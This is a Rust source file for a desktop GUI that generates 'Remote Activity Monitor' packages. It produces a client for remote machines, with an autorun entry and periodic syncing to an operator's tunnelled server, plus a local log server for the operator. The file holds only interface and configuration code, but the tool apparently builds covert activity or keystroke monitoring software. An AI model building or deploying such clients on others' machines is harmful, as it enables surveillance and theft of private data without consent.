#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod app_state;
mod config_models;
mod errors;
mod generator_logic;

use eframe::{egui, App, Frame};
use rfd::FileDialog; 
use app_state::GeneratorAppState;
use std::io::Write; 

impl App for GeneratorAppState {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut Frame) {
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.style_mut().spacing.item_spacing = egui::vec2(8.0, 6.0); // Increased spacing a bit
            ui.style_mut().spacing.indent = 12.0;
            
            ui.heading("Remote Activity Monitor - Package Generator");
            ui.add_space(6.0);
            ui.label("This tool generates a client package for remote deployment and a server package for the operator.");
            ui.label("The necessary template binaries and server assets are embedded within this generator.");
            ui.hyperlink_to("View Setup & Usage Instructions Online", "https://github.com/RIZAmohammadkhan/GuiKeyStandalone/blob/main/docs/GENERATOR_GUIDE.md"); // Placeholder
            ui.add_space(10.0);

            egui::ScrollArea::vertical()
                .auto_shrink([false, true])
                .max_height(ui.available_height() - 30.0)
                .show(ui, |ui| {
                
                egui::CollapsingHeader::new("🚀 Core Deployment Configuration")
                    .default_open(true)
                    .show(ui, |ui| {
                        ui.add_space(5.0);
                        ui.strong("Step 1: Configure Public Server URL (Client Target)");
                        ui.label("This is the internet-accessible URL that clients will send data to. It typically ends with '/api/log'. You (the operator) are responsible for making your server reachable at this URL (e.g., via a tunnel like Cloudflare or ngrok, or a reverse proxy).");
                        
                        ui.horizontal(|ui| {
                            ui.label("Public Server URL:");
                            ui.add_sized([ui.available_width(), ui.text_style_height(&egui::TextStyle::Body)], 
                                egui::TextEdit::singleline(&mut self.public_server_url_str)
                                    .hint_text("e.g., https://your-tunnel.example.com/api/log"));
                        });
                        ui.add_space(10.0);

                        ui.strong("Step 2: Select Output Directory");
                        ui.label("Choose a folder where the 'ActivityMonitorClient_Package' and 'LocalLogServer_Package' will be saved.");
                        ui.horizontal(|ui|{
                            ui.label("Output Directory:");
                            ui.add_sized([ui.available_width() - 60.0, ui.text_style_height(&egui::TextStyle::Body)], 
                                egui::TextEdit::singleline(&mut self.output_dir_path_str).hint_text("Path to save generated packages"));
                            if ui.button("📂 Select").on_hover_text("Choose Output Directory").clicked() {
                                if let Some(path) = FileDialog::new().pick_folder() {
                                    self.output_dir_path_str = path.to_string_lossy().into_owned();
                                }
                            }
                        });
                        ui.add_space(5.0);
                    });
                
                ui.add_space(8.0);

                egui::CollapsingHeader::new("🖥️ Local Log Server Configuration (Operator's Machine)")
                    .default_open(true)
                    .show(ui, |ui| {
                    ui.add_space(5.0);
                    ui.label("Configure how the server application (in 'LocalLogServer_Package') will run on your (the operator's) machine. Your tunnel/proxy will point to this local address.");
                    ui.add_space(3.0);
                    egui::Grid::new("server_config_grid")
                        .num_columns(2)
                        .spacing([10.0, 5.0])
                        .min_col_width(180.0) // Ensure labels have enough space
                        .show(ui, |ui| {
                        
                        ui.label("Server Listen Address:");
                        ui.add_sized([ui.available_width(), ui.text_style_height(&egui::TextStyle::Body)],
                            egui::TextEdit::singleline(&mut self.server_config.listen_address)
                                .hint_text("e.g., 0.0.0.0:8090 or 127.0.0.1:8090"));
                        ui.end_row();

                        ui.label("Server Database File Name:");
                        ui.add_sized([ui.available_width(), ui.text_style_height(&egui::TextStyle::Body)],
                            egui::TextEdit::singleline(&mut self.server_config.database_path)
                                .hint_text("e.g., activity_logs.sqlite"));
                        ui.end_row();
                        
                        ui.label("Server Log Retention (days):")
                            .on_hover_text("0 for indefinite. How long the server keeps logs in its database.");
                        ui.add(egui::DragValue::new(&mut self.server_config.log_retention_days)
                            .speed(1.0).clamp_range(0..=3650).suffix(" days"));
                        ui.end_row();
                    });
                     ui.add_space(5.0);
                });
                
                ui.add_space(8.0);

                egui::CollapsingHeader::new("📱 Activity Monitor Client Configuration (Remote Machines)")
                    .default_open(false)
                    .show(ui, |ui| {
                    ui.add_space(5.0);
                    ui.label("These settings apply to the client applications (in 'ActivityMonitorClient_Package') that will be deployed remotely.");
                    ui.add_space(3.0);
                    egui::Grid::new("client_config_grid")
                        .num_columns(2)
                        .spacing([10.0, 5.0])
                        .min_col_width(180.0)
                        .show(ui, |ui| {
                        
                        ui.label("Client Autorun Name:");
                        ui.add_sized([ui.available_width(), ui.text_style_height(&egui::TextStyle::Body)],
                            egui::TextEdit::singleline(&mut self.client_config.app_name_for_autorun));
                        ui.end_row();

                        ui.label("Client Cache Retention (days):")
                            .on_hover_text("0 for indefinite. How long client keeps unsent logs if server is unreachable.");
                        ui.add(egui::DragValue::new(&mut self.client_config.local_log_cache_retention_days)
                            .speed(1.0).clamp_range(0..=365).suffix(" days"));
                        ui.end_row();

                        ui.label("Client Sync Interval (sec):");
                        ui.add(egui::DragValue::new(&mut self.client_config.sync_interval)
                            .speed(10.0).clamp_range(10..=86400).suffix(" s"));
                        ui.end_row();
                        
                        ui.label("Max Client Log File Size (MB):")
                            .on_hover_text("Max size for client's local cache (activity_data.jsonl). 0 for no limit (not recommended).");
                        let mut max_size_u64 = self.client_config.max_log_file_size_mb.unwrap_or(0);
                        if ui.add(egui::DragValue::new(&mut max_size_u64).speed(1.0).clamp_range(0..=1024).suffix(" MB")).changed() {
                            self.client_config.max_log_file_size_mb = if max_size_u64 == 0 { None } else { Some(max_size_u64) };
                        }
                        ui.end_row();

                        ui.label("Client Internal Log Level:");
                        egui::ComboBox::from_id_source("client_log_level_combo")
                            .selected_text(self.client_config.internal_log_level.to_uppercase())
                            .width(ui.available_width())
                            .show_ui(ui, |ui| {
                                ui.selectable_value(&mut self.client_config.internal_log_level, "trace".to_string(), "Trace");
                                ui.selectable_value(&mut self.client_config.internal_log_level, "debug".to_string(), "Debug");
                                ui.selectable_value(&mut self.client_config.internal_log_level, "info".to_string(), "Info");
                                ui.selectable_value(&mut self.client_config.internal_log_level, "warn".to_string(), "Warn");
                                ui.selectable_value(&mut self.client_config.internal_log_level, "error".to_string(), "Error");
                            });
                        ui.end_row();
                    });
                    ui.add_space(5.0);
                });
                
                ui.add_space(15.0);

                ui.with_layout(egui::Layout::top_down(egui::Align::Center), |ui| {
                    let generate_button = egui::Button::new("📦 Generate Deployment Packages")
                        .min_size(egui::vec2(300.0, 35.0));
                    
                    if ui.add_enabled(!self.operation_in_progress, generate_button)
                        .on_hover_text("Generates client & server packages using embedded templates into the selected Output Directory.")
                        .clicked() {
                        self.operation_in_progress = true;
                        self.status_message = "Starting generation process...".to_string();
                        self.generated_client_id_display = "Generating...".to_string();
                        self.generated_key_hex_display_snippet = "Generating...".to_string();
                        
                        match generator_logic::perform_generation(self) {
                            Ok(_) => { /* Status updated in perform_generation */ }
                            Err(e) => {
                                self.status_message = format!("Error: {}", e);
                                self.operation_in_progress = false; // Ensure flag is reset on error
                            }
                        }
                    }
                });

                ui.add_space(10.0);
                ui.separator();
                ui.add_space(5.0);

                if self.operation_in_progress {
                    ui.horizontal(|ui| {
                        ui.spinner();
                        ui.label(&self.status_message);
                    });
                } else {
                    ui.label("Status:");
                    let mut status_display_text = self.status_message.clone();
                    ui.add(
                        egui::TextEdit::multiline(&mut status_display_text)
                            .desired_rows(3)
                            .desired_width(f32::INFINITY)
                            .interactive(false)
                            .font(egui::TextStyle::Monospace) // For better error formatting
                    );

                    if self.generated_client_id_display != "N/A" && self.generated_client_id_display != "Generating..." {
                        ui.horizontal(|ui|{
                            ui.label("Generated Client ID:");
                            let mut client_id_text = self.generated_client_id_display.clone();
                            ui.add_sized([ui.available_width(), ui.text_style_height(&egui::TextStyle::Body)],
                                egui::TextEdit::singleline(&mut client_id_text).interactive(false).font(egui::TextStyle::Monospace));
                        });
                    }
                    
                    if self.generated_key_hex_display_snippet != "N/A" && self.generated_key_hex_display_snippet != "Generating..." {
                         ui.horizontal(|ui|{
                            ui.label("Generated Key (snippet):");
                            let mut key_snippet_text = format!("{}...", self.generated_key_hex_display_snippet);
                            ui.add_sized([ui.available_width(), ui.text_style_height(&egui::TextStyle::Body)],
                                egui::TextEdit::singleline(&mut key_snippet_text).interactive(false).font(egui::TextStyle::Monospace));
                        });
                    }
                }
            }); 
        });
    }
}

fn calculate_window_size() -> [f32; 2] {
    let width = 720.0; 
    let height = 780.0; 
    [width, height]
}

fn main() -> eframe::Result<()> {
    let default_panic_hook = std::panic::take_hook();
    std::panic::set_hook(Box::new(move |panic_info| {
        eprintln!("Generator GUI Panicked: {:?}", panic_info);
        let log_message = format!("PANIC: {:?}\nTimestamp: {}\n", panic_info, chrono::Local::now().to_rfc3339());
        if let Ok(exe_path) = std::env::current_exe() {
            if let Some(exe_dir) = exe_path.parent() {
                let panic_log_path = exe_dir.join("generator_gui_panic.log");
                if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(panic_log_path) {
                    let _ = writeln!(file, "{}", log_message);
                } else {
                     eprintln!("Failed to open/create panic log file for generator GUI.");
                }
            } else {
                eprintln!("Failed to get executable directory for generator GUI panic log.");
            }
        } else {
             eprintln!("Failed to get current executable path for generator GUI panic log.");
        }
        default_panic_hook(panic_info);
    }));
    
    let window_size = calculate_window_size();
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_inner_size(window_size)
            .with_min_inner_size([680.0, 650.0]) 
            .with_resizable(true)
            .with_decorations(true),
        follow_system_theme: true,
        ..Default::default()
    };
    
    eframe::run_native(
        "Remote Activity Monitor - Package Generator (vEmbed)",
        options,
        Box::new(|_cc| Box::new(GeneratorAppState::default())),
    )
}